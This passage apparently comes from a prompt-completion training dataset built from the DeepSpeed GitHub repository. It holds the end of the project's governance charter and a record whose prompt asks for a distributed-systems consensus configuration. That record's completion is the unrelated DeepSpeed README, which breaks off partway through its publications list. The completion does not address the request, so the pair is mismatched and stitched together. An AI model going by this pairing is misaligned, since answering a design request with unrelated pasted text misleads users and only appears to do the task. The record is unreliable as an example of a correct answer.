Project and the Operating Agreement of LF Projects. Contributors will comply with the policies of LF Projects as may be adopted and amended by LF Projects, including, without limitation, the policies listed at https://lfprojects.org/policies/.\n\n2. The TSC may adopt a code of conduct (\"CoC\") for the Project, which is subject to approval by the Series Manager. In the event that a Project-specific CoC has not been approved, the LF Projects Code of Conduct listed at https://lfprojects.org/policies will apply for all Collaborators in the Project.\n\n3. When amending or adopting any policy applicable to the Project, LF Projects will publish such policy, as to be amended or adopted, on its website at least 30 days prior to such policy taking effect; provided, however, that in the case of any amendment of the Trademark Policy or Terms of Use of LF Projects, any such amendment is effective upon publication on LF Project's website.\n\n4. All Collaborators must allow open participation from any individual or organization meeting the requirements for contributing under this Charter and any policies adopted for all Collaborators by the TSC, regardless of competitive interests. Put another way, the Project community must not seek to exclude any participant based on any criteria, requirement, or reason other than those that are reasonable and applied on a non-discriminatory basis to all Collaborators in the Project community.\n\n5. The Project will operate in a transparent, open, collaborative, and ethical manner at all times. The output of all Project discussions, proposals, timelines, decisions, and status should be made open and easily visible to all. Any potential violations of this requirement should be reported immediately to the Series Manager.\n\n## Community Assets\n\n1. LF Projects will hold title to all trade or service marks used by the Project (\"Project Trademarks\"), whether based on common law or registered rights. Project Trademarks will be transferred and assigned to LF Projects to hold on behalf of the Project. Any use of any Project Trademarks by Collaborators in the Project will be in accordance with the license from LF Projects and inure to the benefit of LF Projects.\n\n2. The Project will, as permitted and in accordance with such license from LF Projects, develop and own all Project GitHub and social media accounts, and domain name registrations created by the Project community.\n\n3. Under no circumstances will LF Projects be expected or required to undertake any action on behalf of the Project that is inconsistent with the tax-exempt status or purpose, as applicable, of the Joint Development Foundation or LF Projects, LLC.\n\n## General Rules and Operations\n\nThe Project will:\n\n1. Engage in the work of the Project in a professional manner consistent with maintaining a cohesive community, while also maintaining the goodwill and esteem of LF Projects, Joint Development Foundation, and other partner organizations in the open source community.\n2. Respect the rights of all trademark owners, including any branding and trademark usage guidelines.\n\n## Intellectual Property Policy\n\n1. Collaborators acknowledge that the copyright in all new contributions will be retained by the copyright holder as independent works of authorship and that no contributor or copyright holder will be required to assign copyrights to the Project.\n\n2. Except as described in Section 7.c., all contributions to the Project are subject to the following:\n\n    - All new inbound code contributions to the Project must be made using Apache License, Version 2.0 available at http://www.apache.org/licenses/LICENSE-2.0 (the \"Project License\").\n\t- All new inbound code contributions must also be accompanied by a Developer Certificate of Origin (http://developercertificate.org) sign-off in the source code system that is submitted through a TSC-approved contribution process which will bind the authorized contributor and, if not self-employed, their employer to the applicable license.\n\t- All outbound code will be made available under the Project License.\n\t- Documentation will be received and made available by the Project under the Creative Commons Attribution 4.0 International License (available at http://creativecommons.org/licenses/by/4.0/).\n\t- The Project may seek to integrate and contribute back to other open source projects (\"Upstream Projects\"). In such cases, the Project will conform to all license requirements of the Upstream Projects, including dependencies, leveraged by the Project. Upstream Project code contributions not stored within the Project's main code repository will comply with the contribution process and license terms for the applicable Upstream Project.\n\n3. The TSC may approve the use of an alternative license or licenses for inbound or outbound contributions on an exception basis. To request an exception, please describe the contribution, the alternative open source license(s), and the justification for using an alternative open source license for the Project. License exceptions must be approved by a two-thirds vote of the entire TSC.\n\n4. Contributed files should contain license information, such as SPDX short form identifiers, indicating the open source license or licenses pertaining to the file.\n\n## Amendments\n\n1. This charter may be amended by a two-thirds vote of the entire TSC and is subject to approval by LF Projects.\n", "metadata": {"source": "github.com/deepspeedai/DeepSpeed", "file_path": "GOVERNANCE.md", "language": "markdown", "complexity": "medium", "star_count": 39501, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 102}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "[![License Apache 2.0](https://badgen.net/badge/license/apache2.0/blue)](https://github.com/deepspeedai/DeepSpeed/blob/master/LICENSE)\n[![PyPI version](https://badge.fury.io/py/deepspeed.svg)](https://pypi.org/project/deepspeed/)\n[![Downloads](https://static.pepy.tech/badge/deepspeed)](https://pepy.tech/project/deepspeed)\n[![Build](https://badgen.net/badge/build/check-status/blue)](#build-pipeline-status)\n[![OpenSSF Best Practices](https://www.bestpractices.dev/projects/9530/badge)](https://www.bestpractices.dev/projects/9530)\n[![Twitter](https://img.shields.io/twitter/follow/DeepSpeedAI)](https://twitter.com/intent/follow?screen_name=DeepSpeedAI)\n[![Japanese Twitter](https://img.shields.io/badge/%E6%97%A5%E6%9C%AC%E8%AA%9ETwitter-%40DeepSpeedAI_JP-blue)](https://twitter.com/DeepSpeedAI_JP)\n[![Chinese Zhihu](https://img.shields.io/badge/%E7%9F%A5%E4%B9%8E-%E5%BE%AE%E8%BD%AFDeepSpeed-blue)](https://www.zhihu.com/people/deepspeed)\n\n\n<div align=\"center\">\n <img src=\"docs/assets/images/DeepSpeed_light.svg#gh-light-mode-only\" width=\"400px\">\n <img src=\"docs/assets/images/DeepSpeed_dark_transparent.svg#gh-dark-mode-only\" width=\"400px\">\n</div>\n\n## Latest News\n<b> <span style=\"color:orange\" > DeepSpeed empowers ChatGPT-like model training with a single click, offering 15x speedup over SOTA RLHF systems with unprecedented cost reduction at all scales; [learn how](https://github.com/deepspeedai/DeepSpeed/tree/master/blogs/deepspeed-chat)</span>.</b>\n* [2025/06] [Arctic Long Sequence Training (ALST) with DeepSpeed: Scalable And Efficient Training For Multi-Million Token Sequences](https://www.snowflake.com/en/engineering-blog/arctic-long-sequence-training-multi-million-token-ai/)\n* [2025/04] [DeepCompile: Unlocking Compiler Optimization for Distributed Training](https://github.com/deepspeedai/DeepSpeed/blob/master/blogs/deepcompile/README.md)\n* [2025/03] [DeepSpeed-AutoTP: Automatic Tensor Parallel Training of Hugging Face models](https://github.com/deepspeedai/DeepSpeed/blob/master/blogs/huggingface-tp/README.md)\n* [2024/12] [Ulysses-Offload: Democratizing Long Context LLM Training ](https://github.com/deepspeedai/DeepSpeed/blob/master/blogs/ulysses-offload/README.md)\n* [2024/12] [DeepSpeed-Domino: Communication-Free LLM Training Engine](https://github.com/deepspeedai/DeepSpeed/blob/master/blogs/deepspeed-domino/README.md)\n* [2024/08] [DeepSpeed on Windows](https://github.com/deepspeedai/DeepSpeed/tree/master/blogs/windows/08-2024/README.md) [[日本語](https://github.com/deepspeedai/DeepSpeed/tree/master/blogs/windows/08-2024/japanese/README.md)]  [[中文](https://github.com/deepspeedai/DeepSpeed/tree/master/blogs/windows/08-2024/chinese/README.md)]\n\n<!-- NOTE: we must use html for news items otherwise links will be broken in the 'more news' section -->\n<details>\n <summary>More news</summary>\n <ul>\n   <li> [2024/08] <a href=\"https://github.com/deepspeedai/DeepSpeed/blob/master/blogs/deepspeed-gds/README.md\"> DeepNVMe: Improving DL Applications through I/O Optimizations</a> [<a href=\"ttps://github.com/deepspeedai/DeepSpeed/blob/master/blogs/deepspeed-gds/japanese/README.md\"> 日本語 </a>] [<a href=\"https://github.com/deepspeedai/DeepSpeed/blob/master/blogs/deepspeed-gds/japanese/README.md\"> 中文 </a>]</li>\n\n    <li> [2024/07] <a href=\"https://github.com/microsoft/DeepSpeed/tree/master/blogs/deepspeed-ucp/README.md\"> DeepSpeed Universal Checkpointing: Efficient and Flexible Checkpointing for Large Scale Distributed Training</a> [<a href=\"https://github.com/microsoft/DeepSpeed/tree/master/blogs/deepspeed-ucp/japanese/README.md\"> 日本語 </a>] </li>\n\n   <li> [2024/03] <a href=\"https://github.com/microsoft/DeepSpeed/tree/master/blogs/deepspeed-fp6/03-05-2024/README.md\"> DeepSpeed-FP6: The Power of FP6-Centric Serving for Large Language Models</a> [<a href=\"https://github.com/microsoft/DeepSpeed/tree/master/blogs/deepspeed-fp6/03-05-2024/README-Chinese.md\"> 中文 </a>] </li>\n\n </ul>\n</details>\n\n---\n\n# Extreme Speed and Scale for DL Training and Inference\n\n***[DeepSpeed](https://www.deepspeed.ai/) enabled the world's most powerful language models (at the time of this writing) such as [MT-530B](https://www.microsoft.com/en-us/research/blog/using-deepspeed-and-megatron-to-train-megatron-turing-nlg-530b-the-worlds-largest-and-most-powerful-generative-language-model/) and [BLOOM](https://huggingface.co/blog/bloom-megatron-deepspeed)***. It is an easy-to-use deep learning optimization software suite that powers unprecedented scale and speed for both training and inference. With DeepSpeed you can:\n\n* Train/Inference dense or sparse models with billions or trillions of parameters\n* Achieve excellent system throughput and efficiently scale to thousands of GPUs\n* Train/Inference on resource constrained GPU systems\n* Achieve unprecedented low latency and high throughput for inference\n* Achieve extreme compression for an unparalleled inference latency and model size reduction with low costs\n\n---\n\n# DeepSpeed's four innovation pillars\n\n<img src=\"docs/assets/images/DeepSpeed-pillars.png\" width=\"800px\">\n\n\n## DeepSpeed-Training\n\nDeepSpeed offers a confluence of system innovations, that has made large scale DL training effective, and efficient, greatly improved ease of use, and redefined the DL training landscape in terms of scale that is possible. These innovations such as ZeRO, 3D-Parallelism, DeepSpeed-MoE, ZeRO-Infinity, etc. fall under the training pillar. Learn more: [DeepSpeed-Training](https://www.deepspeed.ai/training/)\n\n## DeepSpeed-Inference\n\nDeepSpeed brings together innovations in parallelism technology such as tensor, pipeline, expert and ZeRO-parallelism, and combines them with high performance custom inference kernels, communication optimizations and heterogeneous memory technologies to enable inference at an unprecedented scale, while achieving unparalleled latency, throughput and cost reduction. This systematic composition of system technologies for inference falls under the inference pillar. Learn more: [DeepSpeed-Inference](https://www.deepspeed.ai/inference)\n\n\n## DeepSpeed-Compression\n\nTo further increase the inference efficiency, DeepSpeed offers easy-to-use and flexible-to-compose compression techniques for researchers and practitioners to compress their models while delivering faster speed, smaller model size, and significantly reduced compression cost. Moreover, SoTA innovations on compression like ZeroQuant and XTC are included under the compression pillar. Learn more: [DeepSpeed-Compression](https://www.deepspeed.ai/compression)\n\n## DeepSpeed4Science\n\nIn line with Microsoft's mission to solve humanity's most pressing challenges, the DeepSpeed team at Microsoft is responding to this opportunity by launching a new initiative called *DeepSpeed4Science*, aiming to build unique capabilities through AI system technology innovations to help domain experts to unlock today's biggest science mysteries. Learn more: [tutorials](https://www.deepspeed.ai/deepspeed4science/)\n\n---\n\n# DeepSpeed Software Suite\n\n## DeepSpeed Library\n\n   The [DeepSpeed](https://github.com/deepspeedai/deepspeed) library (this repository) implements and packages the innovations and technologies in DeepSpeed Training, Inference and Compression Pillars into a single easy-to-use, open-sourced repository. It allows for easy composition of multitude of features within a single training, inference or compression pipeline. The DeepSpeed Library is heavily adopted by the DL community, and has been used to enable some of the most powerful models (see [DeepSpeed Adoption](#deepspeed-adoption)).\n\n## Model Implementations for Inference (MII)\n\n   [Model Implementations for Inference (MII)](https://github.com/deepspeedai/deepspeed-mii) is an open-sourced repository for making low-latency and high-throughput inference accessible to all data scientists by alleviating the need to apply complex system optimization techniques themselves. Out-of-box, MII offers support for thousands of widely used DL models, optimized using DeepSpeed-Inference, that can be deployed with a few lines of code, while achieving significant latency reduction compared to their vanilla open-sourced versions.\n\n## DeepSpeed on Azure\n\n   DeepSpeed users are diverse and have access to different environments. We recommend to try DeepSpeed on Azure as it is the simplest and easiest method. The recommended method to try DeepSpeed on Azure is through AzureML [recipes](https://github.com/Azure/azureml-examples/tree/main/v1/python-sdk/workflows/train/deepspeed). The job submission and data preparation scripts have been made available [here](https://github.com/deepspeedai/Megatron-DeepSpeed/tree/main/examples_deepspeed/azureml). For more details on how to use DeepSpeed on Azure, please follow the [Azure tutorial](https://www.deepspeed.ai/tutorials/azure/).\n\n---\n\n# DeepSpeed Adoption\n\nDeepSpeed was an important part of Microsoft’s\n[AI at Scale](https://www.microsoft.com/en-us/research/project/ai-at-scale/)\ninitiative to enable next-generation AI capabilities at scale, where you can find more\ninformation [here](https://innovation.microsoft.com/en-us/exploring-ai-at-scale).\n\nDeepSpeed has been used to train many different large-scale models, below is a list of several examples that we are aware of (if you'd like to include your model please submit a PR):\n\n  * [Megatron-Turing NLG (530B)](https://www.microsoft.com/en-us/research/blog/using-deepspeed-and-megatron-to-train-megatron-turing-nlg-530b-the-worlds-largest-and-most-powerful-generative-language-model/)\n  * [Jurassic-1 (178B)](https://uploads-ssl.webflow.com/60fd4503684b466578c0d307/61138924626a6981ee09caf6_jurassic_tech_paper.pdf)\n  * [BLOOM (176B)](https://huggingface.co/blog/bloom-megatron-deepspeed)\n  * [GLM (130B)](https://github.com/THUDM/GLM-130B)\n  * [xTrimoPGLM (100B)](https://www.biorxiv.org/content/10.1101/2023.07.05.547496v2)\n  * [YaLM (100B)](https://github.com/yandex/YaLM-100B)\n  * [GPT-NeoX (20B)](https://github.com/EleutherAI/gpt-neox)\n  * [AlexaTM (20B)](https://www.amazon.science/blog/20b-parameter-alexa-model-sets-new-marks-in-few-shot-learning)\n  * [Turing NLG (17B)](https://www.microsoft.com/en-us/research/blog/turing-nlg-a-17-billion-parameter-language-model-by-microsoft/)\n  * [METRO-LM (5.4B)](https://arxiv.org/pdf/2204.06644.pdf)\n\nDeepSpeed has been integrated with several different popular open-source DL frameworks such as:\n\n|                                                                                                | Documentation                                |\n| ---------------------------------------------------------------------------------------------- | -------------------------------------------- |\n<img src=\"docs/assets/images/transformers-light.png#gh-light-mode-only\" width=\"250px\"><img src=\"docs/assets/images/transformers-dark.png#gh-dark-mode-only\" width=\"250px\"> | [Transformers with DeepSpeed](https://huggingface.co/docs/transformers/deepspeed) |\n| <img src=\"docs/assets/images/accelerate-light.png#gh-light-mode-only\" width=\"250px\"><img src=\"docs/assets/images/accelerate-dark.png#gh-dark-mode-only\" width=\"250px\"> | [Accelerate with DeepSpeed](https://huggingface.co/docs/accelerate/usage_guides/deepspeed) |\n| <img src=\"docs/assets/images/lightning-light.svg#gh-light-mode-only\" width=\"200px\"><img src=\"docs/assets/images/lightning-dark.svg#gh-dark-mode-only\" width=\"200px\"> | [Lightning with DeepSpeed](https://lightning.ai/docs/pytorch/stable/advanced/model_parallel.html#deepspeed) |\n| <img src=\"docs/assets/images/mosaicml.svg\" width=\"200px\"> | [MosaicML with DeepSpeed](https://docs.mosaicml.com/projects/composer/en/latest/trainer/using_the_trainer.html?highlight=deepspeed#deepspeed-integration) |\n| <img src=\"docs/assets/images/determined.svg\" width=\"225px\"> | [Determined with DeepSpeed](https://docs.determined.ai/latest/training/apis-howto/deepspeed/overview.html) |\n| <img src=\"https://user-images.githubusercontent.com/58739961/187154444-fce76639-ac8d-429b-9354-c6fac64b7ef8.jpg\" width=150> | [MMEngine with DeepSpeed](https://mmengine.readthedocs.io/en/latest/common_usage/large_model_training.html#deepspeed) |\n\n---\n\n# Build Pipeline Status\n\n| Description | Status |\n| ----------- | ------ |\n| NVIDIA | [![nv-torch-latest-v100](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-torch-latest-v100.yml/badge.svg?branch=master)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-torch-latest-v100.yml)  [![nv-inference](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-inference.yml/badge.svg?branch=master)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-inference.yml) [![nv-nightly](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-nightly.yml/badge.svg?branch=master)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-nightly.yml) |\n| AMD | [![amd-mi200](https://github.com/deepspeedai/DeepSpeed/actions/workflows/amd-mi200.yml/badge.svg?branch=master)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/amd-mi200.yml) |\n| CPU | [![torch-latest-cpu](https://github.com/deepspeedai/DeepSpeed/actions/workflows/cpu-torch-latest.yml/badge.svg?branch=master)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/cpu-torch-latest.yml) |\n| Intel Gaudi | [![hpu-gaudi2](https://github.com/deepspeedai/DeepSpeed/actions/workflows/hpu-gaudi2.yml/badge.svg?branch=master)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/hpu-gaudi2.yml) |\n| Intel XPU | [![xpu-max1100](https://github.com/deepspeedai/DeepSpeed/actions/workflows/xpu-max1100.yml/badge.svg?branch=master)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/xpu-max1100.yml) |\n| PyTorch Nightly | [![nv-torch-nightly-v100](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-torch-nightly-v100.yml/badge.svg?branch=master)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-torch-nightly-v100.yml) |\n| Integrations | [![nv-transformers-v100](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-transformers-v100.yml/badge.svg?branch=master)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-transformers-v100.yml) [![nv-lightning-v100](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-lightning-v100.yml/badge.svg?branch=master)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-lightning-v100.yml) [![nv-accelerate-v100](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-accelerate-v100.yml/badge.svg?branch=master)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-accelerate-v100.yml) [![nv-mii](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-mii.yml/badge.svg?branch=master)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-mii.yml) [![nv-ds-chat](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-ds-chat.yml/badge.svg?branch=master)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-ds-chat.yml) [![nv-sd](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-sd.yml/badge.svg)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-sd.yml) |\n| Misc | [![Formatting](https://github.com/deepspeedai/DeepSpeed/actions/workflows/formatting.yml/badge.svg?branch=master)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/formatting.yml) [![pages-build-deployment](https://github.com/deepspeedai/DeepSpeed/actions/workflows/pages/pages-build-deployment/badge.svg)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/pages/pages-build-deployment) [![Documentation Status](https://readthedocs.org/projects/deepspeed/badge/?version=latest)](https://deepspeed.readthedocs.io/en/latest/?badge=latest)[![python](https://github.com/deepspeedai/DeepSpeed/actions/workflows/python.yml/badge.svg?branch=master)](https://github.com/deepspeedai/DeepSpeed/actions/workflows/python.yml) |\n| Huawei Ascend NPU | [![Huawei Ascend NPU](https://github.com/Ascend/Ascend-CI/actions/workflows/deepspeed.yaml/badge.svg?branch=main)](https://github.com/Ascend/Ascend-CI/actions/workflows/deepspeed.yaml) |\n\n# Installation\n\nThe quickest way to get started with DeepSpeed is via pip, this will install\nthe latest release of DeepSpeed which is not tied to specific PyTorch or CUDA\nversions. DeepSpeed includes several C++/CUDA extensions that we commonly refer\nto as our 'ops'.  By default, all of these extensions/ops will be built\njust-in-time (JIT) using [torch's JIT C++ extension loader that relies on\nninja](https://pytorch.org/docs/stable/cpp_extension.html) to build and\ndynamically link them at runtime.\n\n## Requirements\n* [PyTorch](https://pytorch.org/) must be installed _before_ installing DeepSpeed.\n* For full feature support we recommend a version of PyTorch that is >= 1.9 and ideally the latest PyTorch stable release.\n* A CUDA or ROCm compiler such as [nvcc](https://docs.nvidia.com/cuda/cuda-compiler-driver-nvcc/#introduction) or [hipcc](https://github.com/ROCm-Developer-Tools/HIPCC) used to compile C++/CUDA/HIP extensions.\n* Specific GPUs we develop and test against are listed below, this doesn't mean your GPU will not work if it doesn't fall into this category it's just DeepSpeed is most well tested on the following:\n  * NVIDIA: Pascal, Volta, Ampere, and Hopper architectures\n  * AMD: MI100 and MI200\n\n## Contributed HW support\n* DeepSpeed now support various HW accelerators.\n\n| Contributor | Hardware                            | Accelerator Name | Contributor validated | Upstream validated |\n|-------------|-------------------------------------|------------------| --------------------- |--------------------|\n| Huawei      | Huawei Ascend NPU                   | npu              | Yes | No                 |\n| Intel       | Intel(R) Gaudi(R) 2 AI accelerator  | hpu              | Yes | Yes                |\n| Intel       | Intel(R) Xeon(R) Processors         | cpu              | Yes | Yes                |\n| Intel       | Intel(R) Data Center GPU Max series | xpu              | Yes | Yes                |\n| Tecorigin   | Scalable Data Analytics Accelerator | sdaa             | Yes | No                 |\n\n## PyPI\nWe regularly push releases to [PyPI](https://pypi.org/project/deepspeed/) and encourage users to install from there in most cases.\n\n```bash\npip install deepspeed\n```\n\nAfter installation, you can validate your install and see which extensions/ops\nyour machine is compatible with via the DeepSpeed environment report.\n\n```bash\nds_report\n```\n\nIf you would like to pre-install any of the DeepSpeed extensions/ops (instead\nof JIT compiling) or install pre-compiled ops via PyPI please see our [advanced\ninstallation instructions](https://www.deepspeed.ai/tutorials/advanced-install/).\n\n## Windows\nMany DeepSpeed features are supported on Windows for both training and inference. You can read more about this in the original blog post [here](https://github.com/deepspeedai/DeepSpeed/tree/master/blogs/windows/08-2024/README.md). Among features that are currently not supported are async io (AIO) and GDS (which does not support Windows).\n1. Install PyTorch, such as pytorch 2.3+cu121.\n2. Install Visual C++ build tools, such as VS2022 C++ x64/x86 build tools.\n3. Launch Cmd console with Administrator permissions for creating required symlink folders and ensure MSVC tools are added to your PATH or launch the Developer Command Prompt for Visual Studio 2022 with administrator permissions.\n4. Run `build_win.bat` to build wheel in `dist` folder.\n\n# Features\n\nPlease checkout [DeepSpeed-Training](https://www.deepspeed.ai/training), [DeepSpeed-Inference](https://www.deepspeed.ai/inference) and [DeepSpeed-Compression](https://www.deepspeed.ai/compression) pages for full set of features offered along each of these three pillars.\n\n# Further Reading\n\nAll DeepSpeed documentation, tutorials, and blogs can be found on our website: [deepspeed.ai](https://www.deepspeed.ai/)\n\n\n|                                                                                                | Description                                  |\n| ---------------------------------------------------------------------------------------------- | -------------------------------------------- |\n| [Getting Started](https://www.deepspeed.ai/getting-started/)                                   |  First steps with DeepSpeed                  |\n| [DeepSpeed JSON Configuration](https://www.deepspeed.ai/docs/config-json/)                     |  Configuring DeepSpeed                       |\n| [API Documentation](https://deepspeed.readthedocs.io/en/latest/)                               |  Generated DeepSpeed API documentation       |\n| [Tutorials](https://www.deepspeed.ai/tutorials/)                                               |  Tutorials                                   |\n| [Blogs](https://www.deepspeed.ai/posts/)                                                       |  Blogs                                   |\n\n\n# Contributing\nDeepSpeed welcomes your contributions! Please see our\n[contributing](CONTRIBUTING.md) guide for more details on formatting, testing,\netc.<br/>\nThanks so much to all of our amazing contributors!\n\n<a href=\"https://github.com/deepspeedai/DeepSpeed/graphs/contributors\">\n  <img src=\"https://contrib.rocks/image?repo=microsoft/DeepSpeed&r=\"  width=\"800px\"/>\n</a>\n\n## Contributor License Agreement\nThis project welcomes contributions and suggestions. Most contributions require you to\nagree to a Contributor License Agreement (CLA) declaring that you have the right to, and\nactually do, grant us the rights to use your contribution. For details, visit\nhttps://cla.opensource.microsoft.com.\n\nWhen you submit a pull request, a CLA bot will automatically determine whether you need\nto provide a CLA and decorate the PR appropriately (e.g., status check, comment). Simply\nfollow the instructions provided by the bot. You will only need to do this once across\nall repos using our CLA.\n\n## Code of Conduct\nThis project has adopted the [Microsoft Open Source Code of\nConduct](https://opensource.microsoft.com/codeofconduct/). For more information see the\n[Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or contact\n[opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.\n\n# Publications\n1. Samyam Rajbhandari, Jeff Rasley, Olatunji Ruwase, Yuxiong He. (2019) ZeRO: memory optimizations toward training trillion parameter models. [arXiv:1910.02054](https://arxiv.org/abs/1910.02054) and [In Proceedings of the International Conference for High Performance Computing, Networking, Storage and Analysis (SC '20)](https://dl.acm.org/doi/10.5555/3433701.3433727).\n2. Jeff Rasley, Samyam Rajbhandari, Olatunji Ruwase, and Yuxiong He. (2020) DeepSpeed: System Optimizations Enable Training Deep Learning Models with Over 100 Billion Parameters. [In Proceedings of the 26th ACM SIGKDD International Conference on Knowledge Discovery & Data Mining (KDD '20, Tutorial)](https://dl.acm.org/doi/10.1145/3394486.3406703).\n3. Minjia Zhang, Yuxiong He. (2020) Accelerating Training of Transformer-Based Language Models with Progressive Layer Dropping. [arXiv:2010.13369](https://arxiv.org/abs/2010.13369) and [NeurIPS 2020](https://proceedings.neurips.cc/paper/2020/hash/a1140a3d0df1c81e24ae954d935e8926-Abstract.html).\n4. Jie Ren, Samyam Rajbhandari, Reza Yazdani Aminabadi, Olatunji Ruwase, Shuangyan Yang, Minjia Zhang, Dong Li, Yuxiong He. (2021) ZeRO-Offload: Democratizing Billion-Scale Model Training. [arXiv:2101.06840](https://arxiv.org/abs/2101.06840) and [USENIX ATC 2021](https://www.usenix.org/conference/atc21/presentation/ren-jie). [[paper]](https://arxiv.org/abs/2101.06840) [[slides]](https://www.usenix.org/system/files/atc21_slides_ren-jie.pdf) [[blog]](https://www.microsoft.com/en-us/research/blog/deepspeed-extreme-scale-model-training-for-everyone/)\n5. Hanlin Tang, Shaoduo Gan, Ammar Ahmad Awan, Samyam Rajbhandari, Conglong Li, Xiangru Lian, Ji Liu, Ce Zhang, Yuxiong He. (2021) 1-bit Adam: Communication Efficient Large-Scale Training with Adam's Convergence Speed. [arXiv:2102.02888](https://arxiv.org/abs/2102.02888) and [ICML 2021](http://proceedings.mlr.press/v139/tang21a.html).\n6. Samyam Rajbhandari, Olatunji Ruwase, Jeff Rasley, Shaden Smith, Yuxiong He. (2021) ZeRO-Infinity: Breaking the GPU Memory Wall for Extreme Scale Deep Learning. [arXiv:2104.07857](https://arxiv.org/abs/2104.07857) and [SC 2021](https://dl.acm.org/doi/abs/10.1145/3458817.3476205). [[paper]](https://arxiv.org/abs/2104.07857) [[slides]](docs/assets/files/SC21-ZeRO-Infinity.pdf) [[blog]](https://www.microsoft.com/en-us/research/blog/zero-infinity-and-deepspeed-unlocking-unprecedented-model-scale-for-deep-learning-training/)\n7. Conglong Li, Ammar Ahmad Awan, Hanlin Tang, Samyam Rajbhandari, Yuxiong He. (2021) 1-bit LAMB: Communication Efficient Large-Scale Large-Batch Training with LAMB's Convergence Speed. [arXiv:2104.06069](https://arxiv.org/abs/2104.06069) and [HiPC 2022](https://hipc.org/advance-program/).\n8. Conglong Li, Minjia Zhang, Yuxiong He. (2021) The Stability-Efficiency Dilemma: Investigating Sequence Length Warmup for Training GPT Models. [arXiv:2108.06084](https://arxiv.org/abs/2108.06084) and [NeurIPS 2022](https://openreview.net/forum?id=JpZ5du_Kdh).\n9. Yucheng Lu, Conglong Li, Minjia Zhang, Christopher De Sa, Yuxiong He. (2022) Maximizing Communication Efficiency for Large-scale Training via 0/1 Adam. [arXiv:2202.06009](https://arxiv.org/abs/2202.06009).\n10. Samyam Rajbhandari, Conglong Li, Zhewei Yao, Minjia Zhang, Reza Yazdani Aminabadi, Ammar Ahmad Awan, Jeff Rasley, Yuxiong He. (2022) DeepSpeed-MoE: Advancing Mixture-of-Experts Inference and Training to Power Next-Generation AI Scale [arXiv:2201.05596](https://arxiv.org/abs/2201.05596) and [ICML 2022](https://proceedings.mlr.press/v162/rajbhandari22a.html). [[pdf]](https://arxiv.org/abs/2201.05596) [[slides]](docs/assets/files/ICML-5mins.pdf) [[blog]](https://www.microsoft.com/en-us/research/blog/deepspeed-advancing-moe-inference-and-training-to-power-next-generation-ai-scale/)\n11. Shaden Smith, Mostofa Patwary, Brandon Norick, Patrick LeGresley, Samyam Rajbhandari, Jared Casper, Zhun Liu, Shrimai Prabhumoye, George Zerveas, Vijay Korthikanti, Elton Zhang, Rewon Child, Reza Yazdani Aminabadi, Julie Bernauer, Xia Song, Mohammad Shoeybi, Yuxiong He, Michael Houston, Saurabh Tiwary, Bryan Catanzaro. (2022) Using DeepSpeed and Megatron to Train Megatron-Turing NLG 530B, A Large-Scale Generative Language Model [arXiv:2201.11990](https://arxiv.org/abs/2201.11990).\n12. Xiaoxia Wu, Zhewei Yao, Minjia Zhang, Conglong Li, Yuxiong He. (2022) Extreme Compression for Pre-trained Transformers Made Simple and Efficient. [arXiv:2206.01859](https://arxiv.org/abs/2206.01859) and [NeurIPS 2022](https://openreview.net/forum?id=xNeAhc2CNAl).\n13. Zhewei Yao, Reza Yazdani Aminabadi, Minjia Zhang, Xiaoxia Wu, Conglong Li, Yuxiong He. (2022) ZeroQuant: Efficient and Affordable Post-Training Quantization for Large-Scale Transformers. [arXiv:2206.01861](https://arxiv.org/abs/2206.01861) and [NeurIPS 2022](https://openreview.net/forum?id=f-fVCElZ-G1) [[slides]](docs/assets/files/zeroquant_series.pdf) [[blog]](https://www.microsoft.com/en-us/research/blog/deepspeed-compression-a-composable-library-for-extreme-compression-and-zero-cost-quantization/)\n14. Reza Yazdani Aminabadi, Samyam Rajbhandari, Minjia Zhang, Ammar Ahmad Awan, Cheng Li, Du Li, Elton Zheng, Jeff Rasley, Shaden Smith, Olatunji Ruwase, Yuxiong He. (2022) DeepSpeed Inference: Enabling Efficient Inference of Transformer Models at Unprecedented Scale. [arXiv:2207.00032](https://arxiv.org/abs/2207.00032) and [SC 2022](https://dl.acm.org/doi/abs/10.5555/3571885.3571946). [[paper]](https://arxiv.org/abs/2207.00032) [[slides]](docs/assets/files/sc22-ds-inference.pdf) [[blog]](https://www.microsoft.com/en-us/research/blog/deepspeed-accelerating-large-scale-model-inference-and-training-via-system-optimizations-and-compression/)\n15. Zhewei Yao, Xiaoxia Wu, Conglong Li, Connor Holmes, Minjia Zhang, Cheng Li, Yuxiong He. (2022) Random-LTD: Random and Layerwise Token Dropping 